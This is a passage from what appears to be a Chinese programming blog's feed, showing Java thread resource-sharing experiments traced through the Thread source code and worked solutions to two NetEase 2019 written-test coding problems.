i&#x3D;0;i&lt;100;i++)&#123;<br>            if(ticket&gt;0)&#123;<br>                System.out.println(Thread.currentThread().getName()+&quot;卖票:ticke&#x3D;&quot;+ticket--);<br>            &#125;<br>        &#125;<br>    &#125;<br>    public static void main(String[] args) &#123;<br>        ShareResourceTest2 srt1 &#x3D; new ShareResourceTest2();<br>        Thread t1 &#x3D; new Thread(srt1);<br>        Thread t2 &#x3D; new Thread(srt1);<br>        Thread t3 &#x3D; new Thread(srt1);<br>        t1.start();<br>        t2.start();<br>        t3.start();<br><br>    &#125;<br>&#125;<br><br>&#x2F;&#x2F;部分输出结果 资源共享<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;19<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;18<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;16<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;17<br></code></pre></td></tr></table></figure><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>* 继承Thread类不能实现资源共享<br>*&#x2F;<br>public class ShareResourceTest1 extends Thread&#123;<br>    private int ticket &#x3D;20;<br>    public void run()&#123;<br>        for(int i&#x3D;0;i&lt;100;i++)&#123;<br>            if(ticket&gt;0)&#123;<br>                System.out.println(Thread.currentThread().getName()+&quot;卖票:ticke&#x3D;&quot;+ticket--);<br>            &#125;<br>        &#125;<br>    &#125;<br>    public static void main(String[] args) &#123;<br>        ShareResourceTest1 srt1 &#x3D; new ShareResourceTest1();<br>        ShareResourceTest1 srt1 &#x3D; new ShareResourceTest1();<br>        ShareResourceTest1 srt1 &#x3D; new ShareResourceTest1();<br>        srt1.start();<br>        srt2.start();<br>        srt3.start();<br>    &#125;<br>&#125;<br>&#x2F;&#x2F;部分输出结果 资源没有共享<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;19<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;18<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;17<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;19<br>&#x2F;&#x2F;...<br>&#x2F;&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;1<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;19<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;18<br></code></pre></td></tr></table></figure><p>我一看不对啊，两个main方法都不一样。第一个是创建了一个Runnable然后再用这个Runnable去创建三个新的Thread。第二个直接创建了三个Thread。我陷入了沉思- -，我觉得第二个程序不能资源共享可能是这个main方法的原因，而不是因为继承了Thread类。于是我写了以下代码作为测试。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>*继承Thread类，但可以资源共享。<br>*&#x2F;<br>public class ShareResourceTest1 extends Thread&#123;<br>    private int ticket &#x3D;20;<br>    public void run()&#123;<br>        for(int i&#x3D;0;i&lt;100;i++)&#123;<br>            if(ticket&gt;0)&#123;<br>                System.out.println(Thread.currentThread().getName()+&quot;卖票:ticke&#x3D;&quot;+ticket--);<br>            &#125;<br>        &#125;<br>    &#125;<br>    public static void main(String[] args) &#123;<br>        ShareResourceTest1 srt1 &#x3D; new ShareResourceTest1();<br>        Thread t1 &#x3D; new Thread(srt1);<br>        Thread t2 &#x3D; new Thread(srt1);<br>        Thread t3 &#x3D; new Thread(srt1);<br>        t1.start();<br>        t2.start();<br>        t3.start();<br><br>    &#125;<br>&#125;<br>&#x2F;&#x2F;部分输出结果 资源共享<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;19<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;18<br>&#x2F;&#x2F;Thread-3卖票:ticke&#x3D;17<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;16<br></code></pre></td></tr></table></figure><p>我用这个继承了Thread的类创建了一个对象，然后用它再去创建三个线程，实现了资源共享。证明我的想法没有错，不能资源共享并不是因为它是继承了Thread类。而是因为创建这三个线程的方式。那到底是为什么会造成这种现象呢。<br>两种方式的区别也只有：</p><ul><li>一个是用Thread的无参构造方法构造了三个Thread。</li><li>一个是用Thread的有参构造方法构造了三个Thread。</li></ul><p>于是按ctrl+左键去看看Thread类，发现了这些东西</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plain">public<br>class Thread implements Runnable &#123;<br>&#x2F;&#x2F;...<br>    &#x2F;* For autonumbering anonymous threads. *&#x2F;<br>    private static int threadInitNumber;<br>    &#x2F;* What will be run. *&#x2F;<br>    private Runnable target;<br>&#x2F;&#x2F;...<br>&#x2F;**<br>     * If this thread was constructed using a separate<br>     * &lt;code&gt;Runnable&lt;&#x2F;code&gt; run object, then that<br>     * &lt;code&gt;Runnable&lt;&#x2F;code&gt; object&#39;s &lt;code&gt;run&lt;&#x2F;code&gt; method is called;<br>     * otherwise, this method does nothing and returns.<br>     * &lt;p&gt;<br>     * Subclasses of &lt;code&gt;Thread&lt;&#x2F;code&gt; should override this method.<br>     *<br>     * @see     #start()<br>     * @see     #stop()<br>     * @see     #Thread(ThreadGroup, Runnable, String)<br>     *&#x2F;<br>    @Override<br>    public void run() &#123;<br>        if (target !&#x3D; null) &#123;<br>            target.run();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>于是找到了造成以上三个程序结果的原因：</p><ul><li>注释中的What will be run 是一个 名为target的实现了Runnable接口的对象 。用有参(有target)构造函数构造一个Thread，该线程的run()方法即执行target的run()方法。如果用有参构造函数创建三个线程，并且传入的是同一个实现了Runnable接口的对象，那么这三个线程中的target指向同一个对象。所以这三个线程的对同一个对象进行操作，从而实现资源共享的效果。</li><li>第二个程序用无参构造函数创建线程，则这个target为空，执行Thread本身的run()方法，而这个Thread继承了一个Thread，并重写过run()方法。执行的就是重写过的run()方法。我们创建三个这样的对象，是分别执行每个对象中的run()方法。所以并不能资源共享。</li><li>而第三个程序虽然使用继承的方法重写了Thread的run()方法，但是并没有将这个Thread直接用new实例化来使用。而是用它作为一个Runnable target，重新创建了三个target相同的Thread对象。相当于用继承Thread重写run()方法的方式，来间接地实现Runnable接口= =，然后再创建线程。</li></ul><p>为了再次验证这个想法，我们去找Thread的构造函数。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>*找到了一大堆构造函数，只贴这两个了- -<br>*&#x2F;<br>public<br>class Thread implements Runnable &#123;<br>&#x2F;&#x2F;...<br>public Thread() &#123;<br>        init(null, null, &quot;Thread-&quot; + nextThreadNum(), 0);<br>    &#125;<br>public Thread(Runnable target) &#123;<br>        init(null, target, &quot;Thread-&quot; + nextThreadNum(), 0);<br>    &#125;<br>&#x2F;&#x2F;...<br>&#125;<br></code></pre></td></tr></table></figure><p>发现构造方法其实在用尽可能多的信息去填充init()这个方法的参数，如果没有就填null。<br>（顺便发现线程名称是“Thread-”再加一个数字，这个数字是threadInitNumber++。刚好解释了为什么我们的第三个程序的线程名是从1开始而不是从0开始。因为0被我们创建的第一个Thread占用了）<br>那我们看看init方法的实现</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">private void init(ThreadGroup g, Runnable target, String name,<br>                      long stackSize) &#123;<br>        init(g, target, name, stackSize, null, true);<br>    &#125;<br></code></pre></td></tr></table></figure><p>emmm,它用同样的方式调用了一个参数更全的init方法。于是我们找到了Thread线程构造方法的核心部分。发现构造函数的target正是赋值给了run()方法执行的target。证明了之前的想法。<br>所以说<b>资源共享的本质是，多个线程调用同一个对象的run()方法。</b>那么我们的问题已经有了答案。<br>但来都来了，顺便瞧一下构造一个Thread最多都需要哪些参数吧。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>     * Initializes a Thread.<br>     *<br>     * @param g the Thread group<br>     * @param target the object whose run() method gets called<br>     * @param name the name of the new Thread<br>     * @param stackSize the desired stack size for the new thread, or<br>     *        zero to indicate that this parameter is to be ignored.<br>     * @param acc the AccessControlContext to inherit, or<br>     *            AccessController.getContext() if null<br>     * @param inheritThreadLocals if &#123;@code true&#125;, inherit initial values for<br>     *            inheritable thread-locals from the constructing thread<br>     *&#x2F;<br>    private void init(ThreadGroup g, Runnable target, String name,<br>                      long stackSize, AccessControlContext acc,<br>                      boolean inheritThreadLocals) &#123;<br>       &#x2F;&#x2F;...<br>       &#x2F;&#x2F;当然要包含这句<br>        this.target &#x3D; target;<br>       &#x2F;&#x2F;...<br>    &#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th align="left">含义</th></tr></thead><tbody><tr><td>ThreadGroup g</td><td align="left">设置这个线程的线程组</td></tr><tr><td>Runnable target</td><td align="left">这个线程要执行操作的对象，run()所在的对象。</td></tr><tr><td>String name</td><td align="left">设置线程名</td></tr><tr><td>long stackSize</td><td align="left">设定线程栈的大小，就是这个线程在JVM里栈的大小。</td></tr><tr><td>AccessControlContext acc</td><td align="left">权限控制上下文，不是很懂–<a href="https://www.ibm.com/developerworks/cn/java/j-lo-javasecurity/" target="_blank" rel="noopener">Java安全模型</a></td></tr><tr><td>boolean inheritThreadLocals</td><td align="left">可继承的ThreadLocal</td></tr></tbody></table><p>又看了看Thread的start方法，发现Thread的start方法调用了一个名为start0的本地方法。<br>而该Thread的run()法执行target的run()方法。所以要执行这个线程.run()也就是执行了target.run()。不过并没有新建真正的线程，只是执行了这个方法而已。</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编程题】网易2019笔试：瞌睡</title>
      <link href="/2018/09/11/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%9E%8C%E7%9D%A1/"/>
      <url>/2018/09/11/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%9E%8C%E7%9D%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>小易觉得高数课太无聊了，决定睡觉。不过他对课上的一些内容挺感兴趣，所以希望你在老师讲到有趣的部分的时候叫醒他一下。你知道了小易对一堂课每分钟知识点的感兴趣程度，并以分数量化，以及他在这堂课上每分钟是否会睡着，你可以叫醒他一次，这会使得他在接下来的k分钟内保持清醒。你需要选择一种方案最大化小易这堂课听到的知识点分值。</p><a id="more"></a><h3 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h3><p>第一行 n, k (1 &lt;= n, k &lt;= 105) ，表示这堂课持续多少分钟，以及叫醒小易一次使他能够保持清醒的时间。<br>第二行 n 个数，a1, a2, … , an(1 &lt;= ai &lt;= 104) 表示小易对每分钟知识点的感兴趣评分。<br>第三行 n 个数，t1, t2, … , tn 表示每分钟小易是否清醒, 1表示清醒。</p><h3 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h3><p>小易这堂课听到的知识点的最大兴趣值。</p><p>示例<br>输入</p><p>6 3<br>1 3 5 2 5 4<br>1 1 0 1 0 0<br>1<br>2<br>3<br>输出</p><p>16</p><h3 id="最初解题思路"><a href="#最初解题思路" class="headerlink" title="最初解题思路"></a>最初解题思路</h3><ol><li>把兴趣值和是否醒着储存到一个二维数组。</li><li>复制这个二维数组，按顺序修改数组，模拟每次被叫醒的状态，统计总兴趣值。</li><li>找出总兴趣值中的最大值，输出。</li></ol><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br><br>public class Main &#123;<br>    public static void main(String[] args) &#123;<br>        Scanner sc &#x3D; new Scanner(System.in);<br>        int n &#x3D; sc.nextInt();<br>        int k &#x3D; sc.nextInt();<br>        int[][] scoremap &#x3D; new int[n][2];<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][1]&#x3D;sc.nextInt();<br>        &#125;<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][0]&#x3D;sc.nextInt();<br>        &#125;<br>&#x2F;&#x2F;用于储存每种叫醒情况的总兴趣值<br>        int[] scores&#x3D;new int[n];<br>        for(int i&#x3D;0;i&lt;n;i++)&#123;<br>        &#x2F;&#x2F;克隆原数组<br>            int scoremapClone[][] &#x3D; new int[scoremap.length][];<br>            for(int j&#x3D;0;j&lt;scoremap.length;j++)&#123;<br>                scoremapClone[j]&#x3D;scoremap[j].clone();<br>            &#125;<br>            &#x2F;&#x2F;模拟叫醒<br>            for(int j&#x3D;0;j&lt;k;j++)&#123;<br>                if(i+j&lt;n)&#123;<br>                    scoremapClone[i+j][0]&#x3D;1;<br>                &#125;<br>            &#125;<br>            &#x2F;&#x2F;计算总兴趣值，并储存<br>            for(int j&#x3D;0;j&lt;n;j++)&#123;<br>                if(scoremapClone[j][0]&#x3D;&#x3D;1)&#123;<br>                    scores[i]+&#x3D;scoremapClone[j][1];<br>                &#125;<br>            &#125;<br>        &#125;<br>        &#x2F;&#x2F;找出最大值<br>        int max &#x3D; Arrays.stream(scores).max().getAsInt();<br>        System.out.println(max);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2018/09/11/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%9E%8C%E7%9D%A1/09/11/【编程题】网易2019笔试：瞌睡/真叫人头大.jpg" alt style="width:100px;height:100px" align="right"><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>AC 0.5 ，运行超时。<br>反思：克隆数组花费了大量时间，其实可以不模拟每次修改后的状态，只做实时运算。于是对代码做出改进。<br>其实每次的运算结果也不用都保存起来，最后再取最大值。只要保存一个当前最大值就可以了。</p><h3 id="改进版思路"><a href="#改进版思路" class="headerlink" title="改进版思路"></a>改进版思路</h3><p>把兴趣值和是否醒着储存到一个二维数组。<br>实时计算每次叫醒可以获得的兴趣值，如果大于max（初始化为0）则储存到max。<br>加上固定兴趣值，输出结果。</p><h3 id="改进版代码"><a href="#改进版代码" class="headerlink" title="改进版代码"></a>改进版代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br><br>public class Main &#123;<br>    public static void main(String[] args) &#123;<br>        Scanner sc &#x3D; new Scanner(System.in);<br>        int n&#x3D; sc.nextInt();<br>        int k&#x3D; sc.nextInt();<br>        int[][] scoremap &#x3D; new int[n][2];<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][1]&#x3D;sc.nextInt();<br>        &#125;<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][0]&#x3D;sc.nextInt();<br>        &#125;<br>        &#x2F;&#x2F;最大兴趣值<br>        int max &#x3D; 0;<br>        for(int i&#x3D;0;i&lt;n;i++)&#123;<br>            &#x2F;&#x2F;储存当前叫醒可获得的兴趣值<br>            int cur &#x3D; 0;<br>            &#x2F;&#x2F;计算叫醒可以获得的兴趣值<br>            for(int j&#x3D;0;j&lt;k;j++) &#123;<br>                if (i + j &lt; n&amp;&amp; scoremap[i + j][0] &#x3D;&#x3D; 0) &#123;<br>                    cur +&#x3D; scoremap[i + j][1];<br>                &#125;<br>            &#125;<br>            &#x2F;&#x2F;如果大于max则储存到max<br>            if(cur&gt;max)&#123;<br>                max &#x3D; cur;<br>            &#125;<br>        &#125;<br>        &#x2F;&#x2F;加上固定兴趣值成为总兴趣值<br>        for(int j&#x3D;0;j&lt;n;j++)&#123;<br>            if(scoremap[j][0]&#x3D;&#x3D;1)&#123;<br>                max+&#x3D;scoremap[j][1];<br>            &#125;<br>        &#125;<br>        System.out.println(max);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>AC 0.9 ，运行超时！！！<br><img src="/2018/09/11/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%9E%8C%E7%9D%A1/09/11/【编程题】网易2019笔试：瞌睡/嗯.jpg" alt style="width:110px;height:100px"><br>WTF!!!容老夫再想想。<br><img src="/2018/09/11/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%9E%8C%E7%9D%A1/09/11/【编程题】网易2019笔试：瞌睡/盲目分析.jpg" alt style="width:100px;height:100px"><br>想到的优化方式：</p><ol><li>计算固定兴趣值这部分，其实可以在输入的同时计算，这样就少一个次数为N的循环。<br>（结果改了这个还是AC 0.9,于是又做出了下面的改进）</li><li>当宽度为n的滑动窗口超出k的范围时，所得到的兴趣值会逐渐减少。所以可以取消循环中（i&gt;n-k+1）这部分。</li></ol><h3 id="最终版思路"><a href="#最终版思路" class="headerlink" title="最终版思路"></a>最终版思路</h3><p>其实和上面是一样的，不过从代码逻辑上和思路逻辑上分别减少了一些多余的操作。</p><h3 id="最终版代码"><a href="#最终版代码" class="headerlink" title="最终版代码"></a>最终版代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br><br><br>public class Main &#123;<br>    public static void main(String[] args) &#123;<br>        Scanner sc &#x3D; new Scanner(System.in);<br>        int n &#x3D; sc.nextInt();<br>        int k &#x3D; sc.nextInt();<br>        int[][] scoremap &#x3D; new int[n][2];<br>        &#x2F;&#x2F;最大兴趣值<br>        int stable &#x3D; 0;<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][1]&#x3D;sc.nextInt();<br>        &#125;<br>        &#x2F;&#x2F;在输入的同时储存固定兴趣值到max<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][0]&#x3D;sc.nextInt();<br>            if(scoremap[i][0]&#x3D;&#x3D;1)&#123;<br>                stable+&#x3D;scoremap[i][1];<br>            &#125;<br>        &#125;<br>        &#x2F;&#x2F;最大兴趣值<br>        int max &#x3D; 0;<br>        for(int i&#x3D;0;i&lt;n-k+1;i++)&#123;<br>            &#x2F;&#x2F;储存当前叫醒可获得的兴趣值<br>            int cur &#x3D; 0;<br>            &#x2F;&#x2F;计算叫醒可以获得的兴趣值<br>            for(int j&#x3D;0;j&lt;k;j++) &#123;<br>                if (i + j &lt; n &amp;&amp; scoremap[i + j][0] &#x3D;&#x3D; 0) &#123;<br>                    cur +&#x3D; scoremap[i + j][1];<br>                &#125;<br>            &#125;<br>            &#x2F;&#x2F;如果大于max则储存到max<br>            if(cur&gt;max)&#123;<br>                max &#x3D; cur;<br>            &#125;<br>        &#125;<br>        System.out.println(max+stable);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h3><p>AC 1.0。 NICE，此题完结。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>想想自己写的那个最初版代码真是<br><img src="/2018/09/11/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%9E%8C%E7%9D%A1/09/11/【编程题】网易2019笔试：瞌睡/写的什么垃圾.jpg" alt style="width:110px;height:100px"></p><ul><li>遇到题目不要总想着暴力破解。即使计算机性能强大，但实际上，当遇到某些输入量较大并且时间复杂度- 较高的程序，运行时间会明显增加。</li><li>一定尽量避免重复或者无效代码，可以实时运算的部分就不要占用储存空间。</li><li>对程序尽可能的优化，任意一点优化都可能对结果产生影响。</li><li>看到题目先在纸上画图分析一遍，对整理思路非常有帮助！</li><li>Java8中引入了Stream的概念，对于基本数值型，目前有三种对应的包装类型 Stream：IntStream、LongStream、DoubleStream。用Arrays.stream()方法可以获得一个Stream,本题第一个程序中使用了Stream.max()方法。关于Stream的更多使用可以看<a href="http://www.runoob.com/java/java8-streams.html" target="_blank" rel="noopener">这里</a>。给自己挖个坑= =</li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程题 </category>
          
          <category> 笔试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编程题】网易2019笔试：牛牛找工作</title>
      <link href="/2018/09/09/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%89%9B%E7%89%9B%E6%89%BE%E5%B7%A5%E4%BD%9C/"/>
      <url>/2018/09/09/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%89%9B%E7%89%9B%E6%89%BE%E5%B7%A5%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>做了很多次笔试，编程题总是不能在规定时间内完成。一个原因是算法图的部分没有看。还有一个原因是题做得太少。今天开始打算有空的时候整理一下做过的编程题。总结一下知识点，也对自己的做题历程做一个记录。。。</p><a id="more"></a><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>为了找到自己满意的工作，牛牛收集了每种工作的难度和报酬。牛牛选工作的标准是在难度不超过自身能力值的情况下，牛牛选择报酬最高的工作。在牛牛选定了自己的工作后，牛牛的小伙伴们来找牛牛帮忙选工作，牛牛依然使用自己的标准来帮助小伙伴们。牛牛的小伙伴太多了，于是他只好把这个任务交给了你。<br>输入描述:<br>每个输入包含一个测试用例。<br>每个测试用例的第一行包含两个正整数，分别表示工作的数量N(N&lt;=100000)和小伙伴的数量M(M&lt;=100000)。<br>接下来的N行每行包含两个正整数，分别表示该项工作的难度Di(Di&lt;=1000000000)和报酬Pi(Pi&lt;=1000000000)。<br>接下来的一行包含M个正整数，分别表示M个小伙伴的能力值Ai(Ai&lt;=1000000000)。<br>保证不存在两项工作的报酬相同。</p><p>输出描述:<br>对于每个小伙伴，在单独的一行输出一个正整数表示他能得到的最高报酬。一个工作可以被多个人选择。<br>示例1<br>输入<br>3 3<br>1 100<br>10 1000<br>1000000000 1001<br>9 10 1000000000<br>输出<br>100<br>1000<br>1001</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>首先将工作难度和对应薪资储存在二维数组，按能力要求增序排序。</li><li>排序后需要更新每个难度下的薪资为 可获得的最大值(因为可能存在能力要求高的工作薪资反而低的情况)。</li><li>用二分查找确定能胜任的最大工作难度及其最大报酬。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 